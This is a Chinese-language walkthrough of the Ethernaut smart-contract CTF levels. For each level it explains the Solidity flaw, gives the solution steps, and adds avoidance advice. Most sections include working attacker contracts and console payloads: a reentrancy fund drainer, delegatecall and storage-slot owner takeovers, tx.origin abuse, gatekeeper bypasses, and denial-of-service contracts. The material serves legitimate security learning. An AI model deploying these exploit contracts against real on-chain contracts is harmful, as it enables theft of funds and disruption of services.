[toc]

网址：https://ethernaut.openzeppelin.com

### Hello Ethernaut

**目的**：  熟悉ethernaut环境, 照着敲代码即可

### Fallback

**考点**： fallback函数的使用

合约fallback函数在接收转账或用户调用此合约不存在的函数时触发。

**解题步骤**：

1. 调用contruibute函数使contributions[msg.sender] > 0
2. 用我们自定义的合约转账即可触发Fallback合约的fallback函数，即可拿到owner权限； 
3. withdraw提取所有资产

**代码**：
```
contract.contribute.sendTransaction({value:0.0001*1e18})
web3.eth.sendTransaction({from:player,to:instance,value:1,gas:100000},console.info)
contract.withdraw()
```
**如何避免**： 谨慎处理fallback函数逻辑

### Fallout
**考点**： 查看abi

通过查看abi可以看出构造函数拼写错误，Fallout写成了Fal1out，导致黑客直接调用Fal1out即可获取owner权限

**如何避免**： 检查abi

### Coin Flip
**考点**： 合约中随机数的使用

本例使用last block hash作为随机数，而通过合约调用此合约可以很容易的获得该值

**解题步骤**：
 
自定义合约，获取last block number， 计算得到side，调用flip方法即可

**代码**：
```
pragma solidity ^0.4.18;

import './SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function CoinFlip() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(block.blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}

contract CoinFlipCaller{
    using SafeMath for uint256;
    CoinFlip cf;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    function CoinFlipCaller(address cfAddr) public{
        cf = CoinFlip(cfAddr);
    }
    
    function call() public returns(bool) {
        uint256 blockValue = uint256(block.blockhash(block.number-1));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        // return side;
        cf.flip.gas(100000)(side);
    }
}
```

**如何避免**： 不要使用时间，last blockhash 等与区块相关的值做随机数，时间可以被矿工操控，last blockhash是确定的，即使未来的区块值都是可以操控的；使用真随机数服务避免此问题

### Telephone

**考点**： tx.origin与msg.sender区别

tx.origin为交易发送方（完整调用链上的原始发送方）;<br>
msg.sender：消息发送方（当前调用）

**解题步骤**：
使用自定义合约调用changeOwner即可

**相关漏洞**： 
下例中，当用户给黑客转账时就会把用户的钱转到黑客账户
```
contract projecter{

function() public payable {}

function transfer(address _to, uint _value) {
    if(tokens[tx.origin]>_value){
        tokens[tx.origin] -= _value;
        tokens[_to] += _value;
    }
}

contract hacker {
    function () payable {
        token.transfer(attackerAddress, 10000);
    }
}
```
**如何避免**

尽量不要使用tx.origin进行转账相关操作，除非知道自己在做什么

### Token
**目的**： 使player的balance大于20

**考点**： 整形溢出

solidity中uint整形溢出不报错，如uint(0)-1 = 2**256-1;

**解题步骤**：
调用transfer且value>20即会导致整形溢出
```
contract.transfer( instance, 21)
```
**如何避免**：
运算前判断，可使用SafeMath库

### Delegation
**目的**： 获取owner权限

**考点**： delegatcall原理

黑客利用delegatecall使用外部合约代码而改变内部状态的特性进行攻击。
delegatecall就相当于将所调用的外部代码放入内部代码执行

示例：
```
pragma solidity ^0.4.18;

contract Delegate {

  address public owner;

  function Delegate(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  function Delegation(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  function() public {
    if(delegate.delegatecall(msg.data)) {
      this;
    }
  }
}
```
只需要给Delegation地址发送交易，data为keccak256("pwn()"),即可改变delegation合约的owner

### Force

**目的**： 使合约balance大于0

**考点**： 什么情况下可以强行转账

有三种方法可以给没有paybale fallback函数的合约转账
1. selfdestruct(address)
2. 合约生成前通过计算合约地址向其转账（利用机会太低）
3. 矿工coinbase
selfdestruct(address)会将合约中的所有eth转到该地址中，即使该地址是一个合约地址且没有payable fallback函数。

**代码**：
```
pragma solidity ^0.4.18;

contract Force {/*
                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)
*/}

contract ForceCaller{
    function() public payable {
    }
    
    function kill(address forceAddr) public{
      selfdestruct(forceAddr);
    }
}
```

**如何避免**：
所以不要在合约中通过判断 this.balance == 0 来执行重要逻辑




### Vault
**目的**： 使unclock为true

**考点**： storage变量存储原理

合约私有变量可以通过通过web3.eth.getStorageAt获取。

**解题步骤**：

locked存放在位置0， password存放在位置1
```
//获取password
web3.eth.getStorageAt(1)
```
调用unlock解锁即可
```
pragma solidity ^0.4.18;

contract Vault {
  bool public locked;
  bytes32 private password;

  function Vault(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

**如何避免**：

所以在合约中存储密码等敏感信息需要像在中心化数据库中存储一样考虑其安全性，如对密码加密或只存储密码hash


### King
**目的**：使King合约不能再继续下去

**攻击方法**：当King合约向king转账时，king不能接收货币则此玩法不能再继续；这里是通过“没有payable fallback函数的合约” 调用“King合约”而使该合约地址成为king，别人再无法成功调用King合约的fallback函数

> 注意
>
> 必须使用kingAddr.call.value(msg.value)("0x12121212");来调用King合约fallback函数；kingAddr.call.value(msg.value)只是一个函数而没有执行，这样应该报错，solidity还是不够完善
```
pragma solidity ^0.4.18;

import 'zeppelin-solidity/contracts/ownership/Ownable.sol';

contract King is Ownable {

  address public king;
  uint public prize;

  function King() public payable {
    king = msg.sender;
    prize = msg.value;
  }

  function() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }
}

//攻击者，调用sendByCall发送1eth即可
contract KingCall {
    
    function sendByCall(address kingAddr) public payable{
        //in solidity 0.4.18
         kingAddr.call.value(msg.value)("0x12121212");
         
        //follow two methods will fail, dont know why
        //kingAddr.transfer(msg.value);
        //kingAddr.send(msg.value);
    }
    
    function getBalance() public view returns(uint){
        return this.balance;   
    }
    
    function kill() public{
        selfdestruct(0xcfe860f5b2865941d93a3526119b9435cc2ac0b5);
    }
    
}
```
### Re-entrancy
**相关事件**：DAO事件中黑客利用此漏洞窃取所有资产

**考点**： 重入攻击
1. 给地址转账时使用call使黑客可以递归调用
2. 转账后才对余额进行减操作导致黑客递归调用条件满足

**如何避免**：使用transfer转账，transfer固定gas 2300，发动重入攻击会因为gas不足使交易失败。使用send也可以，send也是固定gas 2300，但send失败返回false，需要根据返回结果做处理，不影响交易结果。

**答案**：
```
pragma solidity ^0.4.18;

import 'openzeppelin-solidity/contracts/math/SafeMath.sol';

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      if(msg.sender.call.value(_amount)()) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  function() public payable {}
}

contract Hacker {
    
    Reentrance r;
    uint public attackCount  = 0;
    
    constructor(address reentranceAddr) public{
        r = Reentrance(reentranceAddr);
    }
    
    function() payable public {
        uint b = address(r).balance;
        if(b>0){
            uint amount = (b-msg.value>1e18)?1e18:b-msg.value;
            r.withdraw(amount);
        }
    }
    
    function attack(uint amount) public {
        attackCount++;
        r.withdraw(amount);
    }
    
    function kill() public {
        selfdestruct(0xCFe860f5b2865941d93A3526119b9435Cc2aC0b5);
    }
}
```


### Elevator
**目的**：使top值为true

**考点**：view修饰的函数并不是不能修改状态变量，只是发出警告不建议修改

**答案**：合约myBuilding1修改了变量 isTop，通过在Elevator的goTo函数中判断gasleft是否有变化来避免此漏洞

*而合约myBuilding也能解题，这里是通过获取外部确定的状态来返回不同的值，答题点不是该考点*
```
pragma solidity ^0.4.18;


interface Building {
  function isLastFloor(uint) view public returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}


contract myBuilding is Building {
    Elevator e;
    uint public topFloor=10;
    
    function myBuilding(address eAddr) public{
        e=Elevator(eAddr);
    }
    
    function isLastFloor(uint) view  public returns (bool){
        return e.floor()>0;
    }
    
    function toTop() public{
        e.goTo(topFloor);
    }
}

//方法2 
contract myBuilding1 is Building {
    Elevator e;
    uint public topFloor=10;
    bool isTop =true;
    
    function myBuilding1(address eAddr) public{
        e=Elevator(eAddr);
    }
    
    function isLastFloor(uint) view  public returns (bool){
        isTop = !isTop;
        return isTop;
    }
    
    function toTop() public{
        e.goTo(topFloor);
    }
}
```
### Privacy
**目的**：使unlcok值为true

**考点**：eth.getStorageAt获取合约中storage变量的值，定长基本类型的值每32字节为一个storage slot；小余32字节的变量会按照变量声明的次序进行存储，多个合并在一个32字节中存储。直到放不下下一个变量，再开辟新空间进行存储。
（具体参照solidity storage变量存储规则）

getStorageAt用法
```
eth.getStorageAt(contract_address,slotIndex);
```

**解题步骤**： 
获取slot2的值即可
```
eth.getStorageAt(contract_address,2);
```

**合约**
```
pragma solidity ^0.4.18;

contract Privacy {

  bool public locked = true;//slot 0(byte0)
  uint256 public constant ID = block.timestamp;
  uint8 private flattening = 10;//slot 0(byte1)
  uint8 private denomination = 255;//slot 0(byte2)
  uint16 private awkwardness = uint16(now);//slot 0(byte3-4)
  bytes32[3] private data; //slot 1，2，3

  function Privacy(bytes32[3] _data) public {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}
```
> 注意：
>
> bytes32的参数的传递形式为"0x0000000000000000000000000000000000000000000000000000000000000123",bytes16形式为"0x00000000000000000000000000000123"; bytes32数组为["0x0000000000000000000000000000000000000000000000000000000000000123","0x0000000000000000000000000000000000000000000000000000000000000456","0x0000000000000000000000000000000000000000000000000000000000000789"]

### GateKeeperOne
**目的**：修改entrant值为player

**考点**： 
1. 调试能力，查看合约执行过程中的变量值变化
2. tx.orign为调用此合约的普通账户（如果是通过A账户通过合约B调用此合约，则tx.orign是A）
3. uint与bytes类型转换

**思路**：opcode中GAS命令为获取剩余GAS, 查看GAS命令下一条即DUP2时的remaining gas或stack 第一个值来计算。

![](https://github.com/wangdayong228/mypic/blob/master/GateKeeperOne%E6%9F%A5%E7%9C%8Bleftgas%E5%80%BC.png?raw=true)

*调试ropsten的交易与调试javascript vm不同，在调用其它合约时，javascript vm中可以查看被调用合约的solidity locals，而ropsten的交易只能查看stack*

**答案**
```
/**
 *Submitted for verification at Etherscan.io on 2018-05-05
*/

pragma solidity ^0.4.18;

contract GatekeeperOne {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(msg.gas % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint32(_gateKey) == uint16(_gateKey));
    require(uint32(_gateKey) != uint64(_gateKey));
    require(uint32(_gateKey) == uint16(tx.origin));
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

//msg.sender是0xCFe860f5b2865941d93A3526119b9435Cc2aC0b5
contract attacker{
    function attach(address gkAddr) public {
        GatekeeperOne(gkAddr).enter.gas(215+8191*10)(0x119b94350000c0b5);
    }
}
```
### GatekeeperTwo
**目的**： 修改entrant值为player

**考点**
1. msg.sender与tx.origin的区别
2. caller是什么，通过合约调用的情况下如何使得extcodesize(caller)值为0
3. 计算uint64(0)-1 的值及异或运算

**思路**
1. A账户通过合约B调用此合约, 则tx.origin为A, msg.sender为B
2. caller与msg.sender是一样的；在初始化代码执行过程中，一个新创
建的地址会出现，但还没有内部的代码，所以extcodesize(caller)值为0
> 参看黄皮书第七节
3. uint64(0)-1 = 0xffffffffffffffff

**答案**
```
pragma solidity ^0.4.18;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract attacker{
    function attacker(address gk2Addr) public{
        bytes8 gatekey = ~bytes8(uint64(keccak256(this)));
        GatekeeperTwo(gk2Addr).enter.gas(100000)(gatekey);
    }
}
```
### Naught Coin
**目的**：把上锁的资金转移出来

**考点**: 对erc20合约的理解及继承的父合约方法的调用

**思路**: 由于子合约只重写了transfer方法，而忽略了transferFrom，increaseApproval方法也需要根据lock时间限制操作。 

**解题步骤**： 先用player账户increaseApproval，再用目标账户transferFrom

> [StandardToken.sol合约地址](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v1.5.0/contracts/token/StandardToken.sol)
```
//increaseApproval
contract.increaseApproval('0x887949dfb5aEd5EAD982bDf1a227e9684d270DE3','1000000000000000000000000')
//用0x887949dfb5aEd5EAD982bDf1a227e9684d270DE3调用合约
contract.transferFrom('0xcfe860f5b2865941d93a3526119b9435cc2ac0b5','0x887949dfb5aEd5EAD982bDf1a227e9684d270DE3','1000000000000000000000000')
```
### Preservation
**目的**：修改owner为player

**考点**：delegatecall执行环境，读取和修改storage变量的值时发生的事情。

通过delegatecall读取和修改storage变量的值时，实际修改的是调用合约的变量值，而修改的具体哪个变量是根据被调用合约所被修改的变量所存储在的slot位置决定的。

**思路**：如本题所示，当执行“timeZone1Library.delegatecall(setTimeSignature, _timeStamp)”时，==实际上修改的是Preservation的变量，修改的变量位置是storedTime在LibraryContract合约中的存储位置，也就是slot0==，对应的就是Preservation的timeZone1Library; 同理，setSecondTime也是修改的Preservation的timeZone1Library

**解题步骤**：
1. 创建attack合约
2. 先调用setSecondTime修改timeZone1Library为恶意合约地址
3. 再调用setFirstTime修改timeZone1Library为player地址

***遇到的问题：** remix在连接私链和ropsten时，有时候实际使用的gas limit与设置值不符，导致交易隐形失败，本例中就是，remix中设置gas limit为3000000，而实际交易中的gas limit为24000左右，导致交易status为1，但实际合约方法中的delegatecall失败了。*<br>
*使用web3发送交易并设置gaslimit后成功。
这个应该属于remix的bug，基本上所有在jvm中成功，而在私链或ropsten失败的情况都属于此种情况。*

```
pragma solidity ^0.4.23;

contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(setTimeSignature, _timeStamp);
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(setTimeSignature, _timeStamp);
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
contract attackContract {
  address public timeZone1Library;
  address public timeZone2Library;
//   address public owner; 
  uint public storedTime;
  
  function setTime(uint _time) public {
    storedTime = _time;
  }
}
```
### Locked
**目的**：使unlocked为true

**考点**：Unintialised Storage Pointers（未初始化的存储指针）的安全问题；
==0.5.0版本后solidity编译时针对这个问题会报错==


EVM中会将数据存储为 storage 或 memory ，在函数中局部变量的默认类型取决于它们本身的类型，未进行初始化的 storage 变量，会指向合约中的其他变量，从而改变其他变量的值，常见的场景就是指向状态变量，改变状态变量的值，导致漏洞的产生。
==结构体，数组和映射的局部变量，在官方手册中有提到这些类型的局部变量默认是放在 storage 中的==

> 参考：solidity官方文档：常见问题 -> 关键字 memory 是什么？是用来做什么的？
> 
> 参考文章：[以太坊 Solidity 未初始化存储指针安全风险浅析](https://www.anquanke.com/post/id/154407)

**思路**：
struct 在局部变量中默认是存放在 storage 中的，因此可以利用 Unintialised Storage Pointers默认指向slot 1的特征，该合约中，newRecord会被当成一个指针，并默认指向slot 0和 slot 1 ，因此在进行p.name和 p.mappedAddress赋值的时候，实际上会修改变量unlocked，slot 1的值。当前slot 1为空闲。

**答案**:
```
contract.register('0x0000000000000000000000000000000000000000000000000000000000000001',player)
```

**代码**:
```
pragma solidity ^0.4.23; 

// A Locked Name Registrar
contract Locked {

    bool public unlocked = false;  // registrar locked, no name updates
    
    struct NameRecord { // map hashes to addresses
        bytes32 name; // 
        address mappedAddress;
    }

    mapping(address => NameRecord) public registeredNameRecord; // records who registered names 
    mapping(bytes32 => address) public resolve; // resolves hashes to addresses
    
    function register(bytes32 _name, address _mappedAddress) public {
        // set up the new NameRecord
        NameRecord newRecord;
        newRecord.name = _name;
        newRecord.mappedAddress = _mappedAddress; 

        resolve[_name] = _mappedAddress;
        registeredNameRecord[msg.sender] = newRecord; 

        require(unlocked); // only allow registrations if contract is unlocked
    }
}
```
### Alien Codex

**目的**：获取owner权限

**考点**：考察如何通过数组在合约中的存储位置达到修改合约变量的目的

#### 问题分解
**问题1**：使contact变为true以操作数组codex，如何给合约方法传入一个长度大于2**200的动态数组？

**考点1**：动态数组类型参数的 abi 编码规则

**规则**:

动态数组类型的参数在编码时，先编码头部，头部为动态数组所在位置相对于第4字节的字节偏移量（不计算包含了函数签名的前 4 字节）。

如有方法 f(uint,uint32[],bytes10,bytes)，则abi编码为：方法哈希前4字节+ uint256值 + uint32[]的所在位置的相对于起始位置的位偏移量 + bytes10值 + bytes所在位置相对于起始位置的位偏移量 + uint32[]长度 + uint32[]值 + bytes长度 + bytes值

*起始位置指第5字节，即函数签名的4个字节不计算在内*

**示例**：
如调用方法 f(uint,uint32[],bytes10,bytes)时传参为 (0x123, [0x456, 0x789], "1234567890", "Hello, world!")， 则abi编码为：
```
0x0000000000000000000000000000000000000000000000000000000000000123 （0x123 补充到 32 字节）
0x0000000000000000000000000000000000000000000000000000000000000080 （第二个参数的数据部分起始位置的偏移量，4*32 字节，正好是头部的大小）
0x3132333435363738393000000000000000000000000000000000000000000000 （"1234567890" 从右边补充到 32 字节）
0x00000000000000000000000000000000000000000000000000000000000000e0 （第四个参数的数据部分起始位置的偏移量 = 第一个动态参数的数据部分起始位置的偏移量 + 第一个动态参数的数据部分的长度 = 4*32 + 3*32，参考后文）
在此之后，跟着第一个动态参数的数据部分 [0x456, 0x789]：

0x0000000000000000000000000000000000000000000000000000000000000002 （数组元素个数，2）
0x0000000000000000000000000000000000000000000000000000000000000456 （第一个数组元素）
0x0000000000000000000000000000000000000000000000000000000000000789 （第二个数组元素）
最后，我们将第二个动态参数的数据部分 "Hello, world!" 进行编码：

0x000000000000000000000000000000000000000000000000000000000000000d （元素个数，在这里是字节数：13）
0x48656c6c6f2c20776f726c642100000000000000000000000000000000000000 （"Hello, world!" 从右边补充到 32 字节）
最后，合并到一起的编码就是（为了清晰，在 函数选择器Function Selector 和每 32 字节之后加了换行）：

0x8be65246
  0000000000000000000000000000000000000000000000000000000000000123
  0000000000000000000000000000000000000000000000000000000000000080
  3132333435363738393000000000000000000000000000000000000000000000
  00000000000000000000000000000000000000000000000000000000000000e0
  0000000000000000000000000000000000000000000000000000000000000002
  0000000000000000000000000000000000000000000000000000000000000456
  0000000000000000000000000000000000000000000000000000000000000789
  000000000000000000000000000000000000000000000000000000000000000d
  48656c6c6f2c20776f726c642100000000000000000000000000000000000000

```
> [solidity官方文档](https://solidity.readthedocs.io/en/v0.4.25/abi-spec.html#use-of-dynamic-types)

**解题步骤：**

构造abi编码调用make_contact，传入数组长度大于2**200即可。
```
  func="0x1d3d4c0b"; // 函数 id
  data1="0000000000000000000000000000000000000000000000000000000000000020"// 偏移
  data2="1000000000000000000000000000000000000000000000000000000000000001"// 长度，构造大于 2**200
  data=func+data1+data2
  web3.eth.sendTransaction({from:player,to:instance,data: data,gas: 1111111},console.info);
```

*疑问： 这里的data2为"ff00000000000000000000000000000000000000000000000000000000000001"时，需要的gas费会超过8000000，不知什么原因*

**问题2**：修改owner变量的值

**考点2**：数组在合约中如何存储

映射mapping 或动态数组本身会根据上述规则来在某个位置 p 处占用一个（未填充的）存储中的插槽（或递归地将该规则应用到 映射mapping 的 映射mapping 或数组的数组）。 对于动态数组，此插槽中会存储数组中元素的数量（字节数组和字符串在这里是一个例外，见下文）。对于 映射mapping ，该插槽未被使用（但它仍是需要的， 以使两个相同的 映射mapping 在彼此之后会使用不同的散列分布）。数组的数据会位于 keccak256(p)。

![solidity各种类型数据存储图](https://github.com/wangdayong228/mypic/blob/master/solidty%20storage%E5%8F%98%E9%87%8F%E5%AD%98%E5%82%A8%E8%A7%84%E5%88%99.png?raw=true)

*注意*： mapping键值为bytes时，键为k的值的数据存储位置为keccak(k的ascii码,uint(p))

**思路**： 数组codex存储的起始位置为keccak256(uint(1)), 而owner存储位置为slot 0，只要改变数组codex第“2**256 - keccak256(uint(1))” 个元素的值为player即可。

**解题步骤**： 

1. 改变length到2**256-1, 负溢出即可，contract.retract()
2. 修改owner所在位置的值， contract.revise('0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a','000000000000000000000000cfe860f5b2865941d93a3526119b9435cc2ac0b5')

**后记**：
solidity不会验证动态数组长度是否与实际相符导致用户可以通过动态数组访问所有storage slot。控制用户的操作数组的能力以避免此问题。

### Denail
**目的**: 使owner无法调用成功withdraw

**考点**：拒绝服务攻击

**思路**：（其实这个是没有答案的，但是提交了能过）方法就是在withdraw时让gas消耗光，但不知道是不是以太坊升级了，现在在call调用assert异常或out of gas后并不会把所有gas花光，而后边执行所需的gas其实已经预留出来了，即使call异常也是withdraw方法的gas正好用光，withdraw方法还是执行成功了。

**答案**:

1. assert会耗光所有gas
2. 通过大计算量逻辑耗光gas
```
pragma solidity ^0.4.24;

import './SafeMath.sol';

contract Denial {

    using SafeMath for uint256;
    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = 0x583031d1113ad414f02576bd6afabfb302140225;
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance.div(100);
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call.value(amountToSend)();
        owner.transfer(amountToSend);
        // keep track of last withdrawal time
        timeLastWithdrawn = now;
        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);
    }

    // allow deposit of funds
    function() payable {}

    // convenience function
    function contractBalance() view returns (uint) {
        return address(this).balance;
    }
}

contract attack {
    
    Denial denial;
    bytes32[] public  bs ;
    
    constructor(address denialAddr) public {
        denial = Denial(denialAddr);
    }
    
    function () payable public {
        //方法1
        assert(false);
        
        //方法2
        // for(uint i=0;i<2**255;i++){
        //     bs.push(bytes32(1));
        // }
        
        //方法3
        // denial.withdraw();
    }
}
```


